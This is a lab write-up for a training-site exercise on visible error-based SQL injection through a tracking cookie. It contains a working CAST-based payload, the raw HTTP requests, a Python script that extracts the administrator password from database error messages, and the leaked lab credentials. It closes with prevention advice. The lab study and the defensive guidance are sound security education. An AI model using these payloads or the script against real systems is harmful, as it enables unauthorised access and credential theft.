# Lab 08: Visible error-based SQL injection

**Goal**: Leak the password for the `administrator` user via visible database error messages and log in to their account.

This lab contains a SQL injection vulnerability in the tracking cookie. The application uses a tracking cookie for analytics and performs a SQL query containing the submitted cookie value. The results of the SQL query are not returned in the application response, but database error messages are displayed directly. The database contains a `users` table with `username` and `password` columns.

---

## 🎯 Solution

1. Intercept a request with Burp Suite and inspect the `TrackingId` cookie.
2. Trigger an error by adding a single quote `'` and observe that detailed database error messages are returned in the response.
3. Construct a query that triggers a data type conversion error to leak the administrator password:
   ```sql
   ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
   ```
4. Extract the leaked password from the error message (`invalid input syntax for type integer: "..."`).
5. Log in as `administrator` using the retrieved password.

![Lab 8 Solution Summary](Pasted%20image%2020260830204432.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Identify Injection Point & Database
Send a request with a modified `TrackingId` cookie in Burp Suite:
```http
Cookie: TrackingId=test'-- ; session=...
```
Observe the response. When an invalid query or type mismatch occurs, PostgreSQL returns verbose error messages in the HTML:
```html
<h4>Database error</h4>
<p class="is-warning">ERROR: invalid input syntax for type integer: "..."</p>
```

### Step 2: Craft the Error-Based Payload
To extract data via errors, force the database to convert a string (the password) into an integer using `CAST(... AS int)`:

```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

> [!NOTE]
> **Why `LIMIT 1`?**
> The `TrackingId` parameter has a length limit. Using `WHERE username='administrator'` might truncate the payload. `LIMIT 1` retrieves the first row (administrator) in fewer characters.

### Step 3: Extract Password from the Response
Send the request with the payload in the `TrackingId` cookie:
```http
GET / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--; session=...
```

The database generates a type casting error containing the leaked password:
```text
ERROR: invalid input syntax for type integer: "wpficvtulc3oxcj55qzu"
```

#### Extracted Credentials:
| Username | Password |
|---|---|
| `administrator` | `wpficvtulc3oxcj55qzu` |

### Step 4: Automate with Python (Optional)
A lightweight Python script to extract the password in a single request:

```python
import requests
import re
from html import unescape
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://<LAB-ID>.web-security-academy.net/"
session_cookie = "<YOUR-SESSION-COOKIE>"

# Compact error-based SQLi payload
payload = "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
cookies = {"TrackingId": payload, "session": session_cookie}

response = requests.get(url, cookies=cookies, verify=False)
decoded_body = unescape(response.text)

# Regex to capture password from PostgreSQL type error
match = re.search(r'invalid input syntax for type integer: "([^"]+)"', decoded_body)
if match:
    print(f"[✅] Extracted Password: {match.group(1)}")
else:
    print("[-] Password not found in response.")
```

### Step 5: Login as Administrator
Go to `/login` and submit:
- **Username**: `administrator`
- **Password**: `wpficvtulc3oxcj55qzu`

> [!SUCCESS]
> **Lab Solved**: Successfully authenticated as Administrator!

---

## 💡 Key Takeaways: Blind SQLi vs Visible Error-Based SQLi

| Feature | Blind SQLi (Conditional) | Visible Error-Based SQLi |
|---|---|---|
| **Data Visibility** | No data returned | Directly visible inside error messages |
| **Requests Needed** | Hundreds / Thousands (Brute-force) | **1 Request** |
| **Extraction Technique** | Character-by-character boolean checks | Type conversion / casting errors (`CAST`, `CONVERT`) |
| **Speed** | Slow | **Instant** |
| **Impact & Severity** | High | **Critical** (Rapid exfiltration) |

---

## 🔒 Prevention

> [!TIP]
> 1. **Disable Detailed Error Messages**: Never display raw database errors or stack traces in production environments.
>    ```php
>    ini_set('display_errors', 0);
>    error_reporting(0);
>    ```
> 2. **Use Parameterized Queries (Prepared Statements)**:
>    ```php
>    $stmt = $pdo->prepare("SELECT * FROM tracking WHERE id = ?");
>    $stmt->execute([$trackingId]);
>    ```
> 3. **Implement Custom Error Pages**: Return generic error pages (e.g., HTTP 500) without exposing internal database implementation details.
